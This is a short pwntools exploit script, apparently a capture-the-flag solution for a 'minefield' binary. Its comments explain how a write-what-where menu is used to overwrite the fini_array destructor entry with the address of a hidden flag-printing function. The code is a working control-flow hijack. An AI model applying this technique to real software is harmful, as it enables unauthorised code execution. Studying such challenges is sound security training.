from pwn import *

# For this challenge we don't have the libc so first thing we do is to
# disassemble the program to know what it does.

elf = ELF("./challenge/minefield")

conn = remote(MACHINE_IP, MACHINE_PORT)

# This one doesn't do a lot, it's not a buffer overflow or something like this.
# All it does is write what we want where we want.

with log.progress("retrieving flag") as progress:
    # First thing we need to do is navigate through the menus to plant the value
    # we want.
    progress.status("choose to plant a mine");
    conn.recvlines(3)
    conn.sendline('2')

    # Here it asks us what type of mine we want to plant but in reality it's
    # where we want to set the value.
    # One good candidate is where is stored the function that runs destructors
    # at the end of the program, the value of this function is stored behind
    # the `__do_global_dtors_aux_fini_array_entry` symbol.
    progress.status("choose where to plant the mine")
    conn.recvuntil("Insert type of mine: ")
    conn.sendline('0x%x' % elf.symbols["__do_global_dtors_aux_fini_array_entry"])

    # Next we need to set the value we want, so what we'll send is the address
    # of the function we wish to execute.
    # By disassembling the binary we can find a function named `_` that will
    # print the flag to us, so here's our win function.
    progress.status("choose what value to set the mine")
    conn.recvuntil("Insert location to plant: ")
    conn.sendline('0x%x' % elf.symbols["_"])

    # Now the bomb as been planted and we've the flag!
    progress.status("run for the flag")
    conn.recvline_startswith(b"Mission accomplished!")
    log.success(conn.recvallS())
